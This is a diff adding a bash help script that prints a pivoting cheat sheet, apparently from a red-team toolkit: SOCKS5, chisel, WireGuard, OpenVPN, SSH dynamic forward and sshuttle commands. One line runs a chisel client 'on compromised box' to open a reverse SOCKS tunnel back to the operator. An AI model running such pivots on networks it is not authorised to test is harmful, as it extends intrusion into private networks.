@@ -1,0 +1,24 @@
+#!/usr/bin/env bash
+cat <<HELP
+[pivot] common patterns:
+
+SOCKS5 server (this box):
+  gw-socks5 [port]                # microsocks on 0.0.0.0:1080
+
+Reverse SOCKS via chisel:
+  gw-chisel-server 8080            # this side (listens on :8080)
+  # On compromised box:
+  chisel client this-host:8080 R:1080:socks
+
+WireGuard:
+  gw-wg-up /work/wg0.conf
+
+OpenVPN:
+  sudo openvpn /work/client.ovpn
+
+SSH dynamic forward (turn this box into your SOCKS5):
+  ssh -D 0.0.0.0:1080 -N user@jumpbox
+
+SSH tunnel-only (sshuttle):
+  sshuttle -r user@jumpbox 10.0.0.0/8 0/0
+HELP
